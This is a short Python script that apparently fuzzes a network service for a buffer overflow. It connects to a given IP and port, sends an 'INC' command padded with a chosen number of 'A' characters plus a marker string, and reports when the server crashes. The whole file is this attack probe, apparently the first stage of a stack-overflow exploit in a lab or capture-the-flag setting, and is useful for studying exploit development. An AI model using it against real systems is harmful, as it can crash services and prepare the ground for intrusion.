import socket
import sys

ip=sys.argv[1]
port=int(sys.argv[2])
length=int(sys.argv[3])

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))
sock.settimeout(5)

data = sock.recv(4096).decode()
print(data)

try:
	print("Trying length: " + str(length))
	badstr = "INC " + "A"*length + "LUKE"
	sock.send(badstr.encode())
	data = sock.recv(4096).decode()
	print(data)
except Exception as E:
	print(E)
	print("Server Crashed")

sock.close()
